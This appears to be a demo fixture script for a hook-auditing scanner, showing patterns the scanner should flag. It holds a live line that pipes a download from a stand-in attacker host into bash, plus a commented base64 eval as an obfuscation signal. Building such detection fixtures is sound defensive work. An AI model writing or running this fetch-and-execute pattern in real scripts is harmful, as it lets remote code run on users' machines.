#!/bin/sh
# demo/sample-repository/scripts/helper.sh
# Inert helper — demonstrates NETWORK + REMOTE_DOWNLOAD + RUNTIME_BOOTSTRAP
# NEVER executed by HookAudit; scanned as text only.
# Capabilities triggered:
# - NETWORK_ACCESS (curl)
# - REMOTE_DOWNLOAD (curl | bash)
# - RUNTIME_BOOTSTRAP (download bun-runtime)
# - PROCESS_EXECUTION (bash)

echo "[demo] helper.sh — inert demo (would download bun-runtime in real attack)"

# Inert pattern matching ChainDrop (no real download, example.com is reserved)
curl -s https://example-attacker.test/bootstrap | bash -s -- --download bun-runtime

# Obfuscation signal for demo (inert, not executed)
# eval(Buffer.from('demo','base64'))

